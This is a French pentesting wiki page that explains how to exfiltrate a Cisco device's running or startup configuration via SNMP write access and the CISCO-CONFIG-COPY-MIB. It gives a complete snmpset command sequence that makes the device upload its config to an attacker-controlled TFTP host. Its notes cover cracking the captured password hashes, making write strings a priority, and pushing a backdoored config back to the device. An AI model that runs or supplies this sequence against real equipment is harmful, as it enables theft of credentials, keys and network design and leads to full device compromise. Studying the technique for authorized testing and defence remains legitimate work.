---
order: 2
title: "Exfiltration de configuration Cisco : extraire la running config via SNMP"
description: "Avec une chaîne de communauté de lecture-écriture sur un équipement Cisco, la config-copy MIB pilote l'équipement pour copier sa running config ou sa startup config vers un serveur TFTP de l'attaquant. La configuration exfiltrée contient les empreintes de l'enable-secret et des mots de passe utilisateur, les chaînes SNMP, les clés et toute la conception du réseau, une seule écriture SNMP se transformant en compromission complète de l'équipement et des identifiants."
keywords:
  - cisco config
  - config-copy mib
  - tftp
  - running-config
  - snmpset
---

# Exfiltration de configuration Cisco

Sur les équipements Cisco IOS, une chaîne de communauté de lecture-écriture fait bien plus que changer un réglage : elle peut faire livrer à l'équipement l'intégralité de sa configuration. La `CISCO-CONFIG-COPY-MIB` (et l'ancienne `OLD-CISCO-SYS-MIB`) permet à un gestionnaire d'ordonner à l'équipement de copier sa running config ou sa startup config vers un serveur TFTP. Un attaquant détenant la chaîne de lecture-écriture met en place un serveur TFTP qu'il contrôle et pilote cette MIB via SNMP, et l'équipement téléverse sa configuration. Cette configuration est le jackpot : elle contient l'enable secret et les empreintes des mots de passe utilisateur locaux, les chaînes de communauté SNMP, les clés VPN et sans fil, la conception du routage et des ACL, et les adresses de gestion, de sorte qu'une seule écriture SNMP devient une compromission complète de l'équipement et un lot d'identifiants.

```bash
# attacker runs a TFTP server (e.g. atftpd/tftpd-hpa) writable to /tftp
# config-copy MIB: copy running-config (4) to a TFTP file on the attacker host
RW=private; T=<attacker-ip>; R=$RANDOM
snmpset -v2c -c $RW <target> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.$R i 1 \     # ConfigCopyProtocol = tftp(1)
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.$R i 4 \     # SourceFileType = runningConfig(4)
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.$R i 1 \     # DestFileType = networkFile(1)
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.$R a $T \    # ServerAddress = attacker TFTP
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.$R s "cfg-$R"  # CopyFileName
# the device uploads its running-config to /tftp/cfg-$R on the attacker host
# tools automate this exact sequence:
#   metasploit auxiliary/scanner/snmp/cisco_config_tftp  (and snmp_enum)
```

## Notes d'exploitation

- Cela nécessite une chaîne de communauté de lecture-écriture ; c'est l'usage le plus impactant de l'écriture SNMP, priorisez donc l'obtention d'une chaîne d'écriture sur le matériel Cisco spécifiquement pour cela.
- La `running-config` téléversée contient l'enable secret et les empreintes utilisateur (à casser hors ligne), les chaînes SNMP (y compris toute chaîne plus robuste) et les clés ; une copie de `startup-config` fonctionne de la même manière si la running est restreinte.
- Le sens inverse est aussi dangereux : la même MIB peut copier une configuration DEPUIS TFTP vers l'équipement (en écrasant la running config ou la startup config), l'accès en écriture permet donc en plus de planter une configuration backdoorée ; cela est traité sous [Accès en écriture](../write-access.md).
- Le module `cisco_config_tftp` de Metasploit automatise la danse de la MIB ; la séquence manuelle `snmpset` est montrée pour l'exactitude et pour un usage hors Metasploit.

## Outils

- [Metasploit cisco_config_tftp](https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/cisco_config_tftp/)

## Références

- [CISCO-CONFIG-COPY-MIB](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/snmp/configuration/15-mt/snmp-15-mt-book.html)
- [HackTricks: SNMP Cisco config](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
